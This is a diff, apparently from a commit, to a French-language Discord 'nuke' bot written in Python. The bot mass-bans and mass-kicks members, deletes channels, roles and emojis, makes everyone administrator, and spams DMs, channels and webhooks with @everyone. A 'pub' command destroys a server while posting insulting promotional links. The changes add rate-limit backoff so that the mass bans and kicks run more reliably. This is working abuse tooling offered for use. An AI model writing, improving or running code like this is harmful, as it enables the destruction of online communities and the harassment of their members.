+        print(Fore.RED + "Création du salon final...")
         try:
             final_channel = await self.selected_guild.create_text_channel("plus-de-serveur")
             await final_channel.send("@everyone # plus de serveur @everyone")
@@ -426,6 +554,10 @@ class DiscordBot(discord.Client):
     async def delete_channels_only(self):
         """Supprime uniquement tous les salons"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         channels = list(self.selected_guild.channels)
@@ -438,6 +570,10 @@ class DiscordBot(discord.Client):
     async def delete_roles_only(self):
         """Supprime uniquement tous les rôles (sauf @everyone)"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         roles = [role for role in self.selected_guild.roles if role.name != "@everyone"]
@@ -450,6 +586,10 @@ class DiscordBot(discord.Client):
     async def delete_emojis_only(self):
         """Supprime uniquement tous les emojis"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         emojis = list(self.selected_guild.emojis)
@@ -462,6 +602,10 @@ class DiscordBot(discord.Client):
     async def make_everyone_admin(self):
         """Crée un rôle admin et l'attribue à tous les membres"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         try:
@@ -484,40 +628,94 @@ class DiscordBot(discord.Client):
     async def ban_everyone(self):
         """Bannit tous les membres du serveur"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         members = [member for member in self.selected_guild.members 
                   if not member.bot and member != self.selected_guild.owner and member != self.user]
+        banned_count = 0
+        failed_count = 0
+
         for member in members:
             try:
                 await member.ban(reason="banall command")
-            except:
+                banned_count += 1
+                print(Fore.RED + f'Membre banni: {member.display_name}')
+                await asyncio.sleep(1.2)  # Délai pour éviter rate limits
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except discord.Forbidden:
+                failed_count += 1
+                print(Fore.RED + f'Pas de permission pour bannir {member.display_name}')
                 continue
+            except Exception as e:
+                failed_count += 1
+                print(Fore.RED + f'Erreur ban {member.display_name}: {e}')
+                continue
+
+        print(Fore.RED + f'Ban terminé: {banned_count} réussis, {failed_count} échecs')
 
     async def kick_everyone(self):
         """Kick tous les membres du serveur"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         members = [member for member in self.selected_guild.members 
                   if not member.bot and member != self.selected_guild.owner and member != self.user]
+        kicked_count = 0
+        failed_count = 0
+
         for member in members:
             try:
                 await member.kick(reason="kickall command")
-            except:
+                kicked_count += 1
+                print(Fore.RED + f'Membre kické: {member.display_name}')
+                await asyncio.sleep(0.8)  # Délai pour éviter rate limits
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except discord.Forbidden:
+                failed_count += 1
+                print(Fore.RED + f'Pas de permission pour kicker {member.display_name}')
                 continue
+            except Exception as e:
+                failed_count += 1
+                print(Fore.RED + f'Erreur kick {member.display_name}: {e}')
+                continue
+
+        print(Fore.RED + f'Kick terminé: {kicked_count} réussis, {failed_count} échecs')
 
     async def send_dm(self):
         """Envoie un message privé à un utilisateur spécifique"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         members = [member for member in self.selected_guild.members 
                   if not member.bot and member != self.user]
@@ -540,7 +738,7 @@ class DiscordBot(discord.Client):
             member_num = int(choice)
             if not (1 <= member_num <= len(members)):
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + f"Numero invalide! Choisissez entre 1 et {len(members)}")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -550,7 +748,7 @@ class DiscordBot(discord.Client):
             message = input(Fore.RED + "Tapez votre message (ou 'b' pour retourner): ").strip()
             if not message:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Message vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -564,19 +762,19 @@ class DiscordBot(discord.Client):
                 count = int(count_str)
                 if not (1 <= count <= 50):
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                     return
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nombre invalide!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Envoi de {count} message(s) a {selected_member.display_name}...")
 
             sent_count = 0
@@ -589,18 +787,18 @@ class DiscordBot(discord.Client):
                     print(Fore.RED + f"Erreur pour le message {i+1}: {e}")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Termine! {sent_count}/{count} messages envoyes a {selected_member.display_name}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
         except ValueError:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Numero invalide!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -608,13 +806,13 @@ class DiscordBot(discord.Client):
         """Envoie un message privé à tous les membres du serveur"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         members = [member for member in self.selected_guild.members 
                   if not member.bot and member != self.user]
@@ -631,7 +829,7 @@ class DiscordBot(discord.Client):
             message = input(Fore.RED + "Tapez votre message (ou 'b' pour retourner): ").strip()
             if not message:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Message vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -645,19 +843,19 @@ class DiscordBot(discord.Client):
                 count = int(count_str)
                 if not (1 <= count <= 50):
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                     return
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nombre invalide!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Envoi de {count} message(s) a {len(members)} membres...")
 
             total_sent = 0
@@ -679,7 +877,7 @@ class DiscordBot(discord.Client):
                 print(Fore.RED + f"  {member_sent}/{count} messages envoyes a {member.display_name}")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Termine!")
             print(Fore.RED + f"Messages envoyes avec succes: {total_sent}")
             print(Fore.RED + f"Messages en echec: {total_failed}")
@@ -688,7 +886,7 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -696,13 +894,13 @@ class DiscordBot(discord.Client):
         """Spam un message dans tous les salons texte du serveur"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         text_channels = [channel for channel in self.selected_guild.channels 
                         if isinstance(channel, discord.TextChannel)]
@@ -719,7 +917,7 @@ class DiscordBot(discord.Client):
             message = input(Fore.RED + "Tapez votre message (ou 'b' pour retourner): ").strip()
             if not message:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Message vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -733,19 +931,19 @@ class DiscordBot(discord.Client):
                 count = int(count_str)
                 if not (1 <= count <= 100):
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Nombre invalide! Limite entre 1 et 100")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                     return
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nombre invalide!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Spam en cours dans {len(text_channels)} salons...")
 
             total_sent = 0
@@ -770,7 +968,7 @@ class DiscordBot(discord.Client):
                 print(Fore.RED + f"  {channel_sent}/{count} messages envoyes dans #{channel.name}")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Spam termine!")
             print(Fore.RED + f"Messages envoyes avec succes: {total_sent}")
             print(Fore.RED + f"Messages en echec: {total_failed}")
@@ -779,7 +977,7 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -787,23 +985,23 @@ class DiscordBot(discord.Client):
         """Menu de création : choisir entre salons ou rôles"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         while True:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Serveur: {self.selected_guild.name}")
             print(Fore.RED + "=== MENU DE CREATION ===")
             print(Fore.RED + "")
             print(Fore.RED + "1. Creer des salons en masse")
             print(Fore.RED + "2. Creer des roles en masse")
             print(Fore.RED + "")
-            
+
             choice = input(Fore.RED + "Choisissez une option (1, 2 ou 'b' pour retour): ").strip().lower()
-            
+
             if choice == 'b':
                 return
             elif choice == '1':
@@ -814,14 +1012,21 @@ class DiscordBot(discord.Client):
                 return
             else:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Choix invalide! Choisissez 1, 2 ou 'b'")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
     async def create_channels_mass(self):
         """Créer des salons en masse"""
+        if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
         print(Fore.RED + f"Nombre de salons actuels: {len(self.selected_guild.channels)}")
@@ -830,7 +1035,7 @@ class DiscordBot(discord.Client):
             base_name = input(Fore.RED + "Nom de base pour les salons (ou 'b' pour retourner): ").strip()
             if not base_name:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nom vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -844,19 +1049,19 @@ class DiscordBot(discord.Client):
                 count = int(count_str)
                 if not (1 <= count <= 100):
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Nombre invalide! Limite entre 1 et 100")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                     return
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nombre invalide!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Creation de {count} salons en cours...")
 
             created_count = 0
@@ -866,10 +1071,13 @@ class DiscordBot(discord.Client):
                 try:
                     channel_name = base_name.lower().replace(' ', '-').replace('_', '-')
 
-                    await self.selected_guild.create_text_channel(
-                        name=channel_name,
-                        reason=f"Creation automatique via commande create"
-                    )
+                    if self.selected_guild:
+                        await self.selected_guild.create_text_channel(
+                            name=channel_name,
+                            reason=f"Creation automatique via commande create"
+                        )
+                    else:
+                        raise Exception("Serveur non selectionne")
                     created_count += 1
                     print(Fore.RED + f"Salon #{channel_name} cree")
                     await asyncio.sleep(0.1)
@@ -879,7 +1087,7 @@ class DiscordBot(discord.Client):
                     print(Fore.RED + f"Erreur creation salon: {e}")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"✅ Creation terminee!")
             print(Fore.RED + f"✅ {created_count} salons crees avec succes")
             if failed_count > 0:
@@ -888,14 +1096,21 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"❌ Erreur lors de la creation: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
     async def create_roles_mass(self):
         """Créer des rôles en masse"""
+        if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
         print(Fore.RED + f"Nombre de roles actuels: {len(self.selected_guild.roles)}")
@@ -904,7 +1119,7 @@ class DiscordBot(discord.Client):
             base_name = input(Fore.RED + "Nom de base pour les roles (ou 'b' pour retourner): ").strip()
             if not base_name:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nom vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -918,19 +1133,19 @@ class DiscordBot(discord.Client):
                 count = int(count_str)
                 if not (1 <= count <= 50):
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                     return
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nombre invalide!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Creation de {count} roles en cours...")
 
             created_count = 0
@@ -940,11 +1155,14 @@ class DiscordBot(discord.Client):
                 try:
                     role_name = base_name
 
-                    await self.selected_guild.create_role(
-                        name=role_name,
-                        color=discord.Color.random(),
-                        reason=f"Creation automatique via commande create"
-                    )
+                    if self.selected_guild:
+                        await self.selected_guild.create_role(
+                            name=role_name,
+                            color=discord.Color.random(),
+                            reason=f"Creation automatique via commande create"
+                        )
+                    else:
+                        raise Exception("Serveur non selectionne")
                     created_count += 1
                     print(Fore.RED + f"Role '{role_name}' cree")
                     await asyncio.sleep(0.1)
@@ -954,7 +1172,7 @@ class DiscordBot(discord.Client):
                     print(Fore.RED + f"Erreur creation role: {e}")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"✅ Creation terminee!")
             print(Fore.RED + f"✅ {created_count} roles crees avec succes")
             if failed_count > 0:
@@ -963,7 +1181,7 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -972,6 +1190,10 @@ class DiscordBot(discord.Client):
     async def kick_all_bots(self):
         """Kick tous les bots du serveur (sauf lui-même)"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         bots = [member for member in self.selected_guild.members 
@@ -1009,7 +1231,7 @@ class DiscordBot(discord.Client):
             await self.selected_guild.leave()
             self.selected_guild = None
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Bot a quitte le serveur {server_name} avec succes!")
             print(Fore.RED + "Vous devez maintenant selectionner un autre serveur.")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
@@ -1017,7 +1239,7 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur lors de la sortie du serveur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -1025,13 +1247,13 @@ class DiscordBot(discord.Client):
         """Renomme le serveur sélectionné"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         current_name = self.selected_guild.name
         print(Fore.RED + f"Serveur actuel: {current_name}")
@@ -1041,7 +1263,7 @@ class DiscordBot(discord.Client):
 
             if not new_name:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nom vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -1051,7 +1273,7 @@ class DiscordBot(discord.Client):
 
             if len(new_name) > 100:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nom trop long! Maximum 100 caracteres.")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -1059,7 +1281,7 @@ class DiscordBot(discord.Client):
             print(Fore.RED + f"Renommage du serveur en cours...")
             await self.selected_guild.edit(name=new_name, reason="Renommage via commande rename")
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Serveur renomme avec succes!")
             print(Fore.RED + f"Ancien nom: {current_name}")
             print(Fore.RED + f"Nouveau nom: {new_name}")
@@ -1067,18 +1289,18 @@ class DiscordBot(discord.Client):
 
         except discord.Forbidden:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Erreur: Permissions insuffisantes pour renommer le serveur!")
             print(Fore.RED + "Le bot doit avoir la permission 'Gerer le serveur'.")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
         except discord.HTTPException as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur lors du renommage: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur inattendue: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -1086,7 +1308,7 @@ class DiscordBot(discord.Client):
         """Bannit un membre aléatoire du serveur"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
@@ -1096,13 +1318,13 @@ class DiscordBot(discord.Client):
 
         if not members:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun membre eligible pour le ban!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
         print(Fore.RED + f"Membres eligibles: {len(members)}")
 
@@ -1116,18 +1338,18 @@ class DiscordBot(discord.Client):
             await random_member.ban(reason="Random ban command")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"✅ {random_member.display_name} a ete banni avec succes!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
         except discord.Forbidden:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "❌ Permissions insuffisantes pour bannir ce membre!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"❌ Erreur lors du bannissement: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -1135,7 +1357,7 @@ class DiscordBot(discord.Client):
         """Kick un membre aléatoire du serveur"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
@@ -1145,13 +1367,13 @@ class DiscordBot(discord.Client):
 
         if not members:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun membre eligible pour le kick!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
         print(Fore.RED + f"Membres eligibles: {len(members)}")
 
@@ -1165,18 +1387,18 @@ class DiscordBot(discord.Client):
             await random_member.kick(reason="Random kick command")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"✅ {random_member.display_name} a ete kické avec succes!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
         except discord.Forbidden:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "❌ Permissions insuffisantes pour kicker ce membre!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"❌ Erreur lors du kick: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -1184,17 +1406,17 @@ class DiscordBot(discord.Client):
         """Commande pub personnalisée : DM aux admins, destruction totale et création salon spam"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
         print(Fore.RED + "=== CONFIGURATION DE LA PUB ===")
         print(Fore.RED + "")
-        
+
         while True:
             user_link = input(Fore.RED + "Entrez votre lien (YouTube/TikTok/autre) ou 'b' pour retour: ").strip()
             if user_link.lower() == 'b':
@@ -1203,16 +1425,16 @@ class DiscordBot(discord.Client):
                 break
             else:
                 print(Fore.RED + "Veuillez entrer un lien valide (doit commencer par http://, https:// ou www.)")
-        
+
         salon_name = input(Fore.RED + "Nom du salon (laissez vide pour 'pub'): ").strip()
         if not salon_name:
             salon_name = "pub"
-        
+
         dm_message = f"abonne toi fdp ta plus de serveur {user_link}"
         spam_message = f"# abonne toi fdp {user_link} @everyone"
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
         print(Fore.RED + f"Lien: {user_link}")
         print(Fore.RED + f"Salon: {salon_name}")
@@ -1324,7 +1546,7 @@ class DiscordBot(discord.Client):
                 print(Fore.RED + f"Erreur création salon spam: {e}")
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "🎯 Commande pub terminée avec succès!")
             print(Fore.RED + f"✅ Messages envoyés aux admins")
             print(Fore.RED + f"✅ Permissions admin données à tous")
@@ -1335,7 +1557,7 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"❌ Erreur lors de la commande pub: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
@@ -1343,13 +1565,13 @@ class DiscordBot(discord.Client):
         """Crée des webhooks dans tous les salons et spam avec"""
         if not self.selected_guild:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + "Aucun serveur selectionne!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
         clear_screen()
-        show_ascii()
+        await show_ascii()
 
         text_channels = [channel for channel in self.selected_guild.channels 
                         if isinstance(channel, discord.TextChannel)]
@@ -1366,7 +1588,7 @@ class DiscordBot(discord.Client):
             message = input(Fore.RED + "Message a spammer via webhook (ou 'b' pour retourner): ").strip()
             if not message:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Message vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -1383,7 +1605,7 @@ class DiscordBot(discord.Client):
             everyone_choice = input(Fore.RED + "Ajouter @everyone au message? (o/n ou 'b' pour retourner): ").strip().lower()
             if everyone_choice == 'b':
                 return
-            
+
             use_everyone = everyone_choice in ['o', 'oui', 'y', 'yes']
 
             count_str = input(Fore.RED + "Combien de messages par salon? (1-50 ou 'b' pour retourner): ").strip()
@@ -1393,13 +1615,13 @@ class DiscordBot(discord.Client):
                 count = int(count_str)
                 if not (1 <= count <= 50):
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                     return
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Nombre invalide!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
@@ -1411,7 +1633,7 @@ class DiscordBot(discord.Client):
                 final_message = message
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Creation de webhooks et spam en cours...")
             if use_everyone:
                 print(Fore.RED + f"Message avec @everyone: {final_message}")
@@ -1457,7 +1679,7 @@ class DiscordBot(discord.Client):
                     continue
 
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Webhook spam termine!")
             print(Fore.RED + f"Webhooks crees: {created_webhooks}")
             print(Fore.RED + f"Messages envoyes avec succes: {total_sent}")
@@ -1467,57 +1689,373 @@ class DiscordBot(discord.Client):
 
         except Exception as e:
             clear_screen()
-            show_ascii()
+            await show_ascii()
             print(Fore.RED + f"Erreur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
-def get_token():
+    async def mass_role_creator(self):
+        """Crée plusieurs rôles avec des noms et couleurs personnalisés"""
+        if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
+        print(Fore.RED + "=== CREATION DE ROLES EN MASSE ===")
+
+        try:
+            role_names = input(Fore.RED + "Noms des roles (separes par des virgules) ou 'b': ").strip()
+            if role_names.lower() == 'b':
+                return
+            
+            if not role_names:
+                print(Fore.RED + "Aucun nom fourni!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+
+            names_list = [name.strip() for name in role_names.split(',') if name.strip()]
+            
+            if len(names_list) > 20:
+                print(Fore.RED + "Maximum 20 roles a la fois!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"Creation de {len(names_list)} roles...")
+
+            created = 0
+            for name in names_list:
+                try:
+                    await self.selected_guild.create_role(
+                        name=name,
+                        color=discord.Color.random(),
+                        reason="Mass role creation"
+                    )
+                    created += 1
+                    print(Fore.RED + f"Role '{name}' cree")
+                    await asyncio.sleep(0.2)
+                except Exception as e:
+                    print(Fore.RED + f"Erreur pour '{name}': {e}")
+
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"✅ {created}/{len(names_list)} roles crees!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+        except Exception as e:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"Erreur: {e}")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+    async def show_server_info(self):
+        """Affiche des informations détaillées sur le serveur"""
+        if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
+        clear_screen()
+        await show_ascii()
+        
+        guild = self.selected_guild
+        
+        print(Fore.RED + "=== INFORMATIONS DU SERVEUR ===")
+        print(Fore.RED + f"Nom: {guild.name}")
+        print(Fore.RED + f"ID: {guild.id}")
+        print(Fore.RED + f"Proprietaire: {guild.owner}")
+        print(Fore.RED + f"Membres: {guild.member_count}")
+        print(Fore.RED + f"Salons: {len(guild.channels)}")
+        print(Fore.RED + f"Roles: {len(guild.roles)}")
+        print(Fore.RED + f"Emojis: {len(guild.emojis)}")
+        print(Fore.RED + f"Niveau de boost: {guild.premium_tier}")
+        print(Fore.RED + f"Boosts: {guild.premium_subscription_count or 0}")
+        print(Fore.RED + f"Region: {guild.region if hasattr(guild, 'region') else 'Non disponible'}")
+        print(Fore.RED + f"Cree le: {guild.created_at.strftime('%d/%m/%Y')}")
+        
+        # Comptage par type de salon
